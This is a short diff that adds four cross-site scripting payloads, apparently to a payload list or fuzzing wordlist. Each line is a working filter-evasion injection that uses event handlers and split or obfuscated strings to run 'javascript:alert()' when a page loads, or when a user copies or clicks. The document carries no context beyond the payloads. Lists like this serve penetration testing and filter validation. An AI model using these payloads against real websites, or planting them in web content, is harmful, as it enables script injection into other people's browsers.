@@ -1,0 +1,4 @@
+<iframe/onload='this["src"]="jav"+"as    cr"+"ipt:al"+"er"+"t()"';>
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//>
+<x/oncopy=alert()>Copy here
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
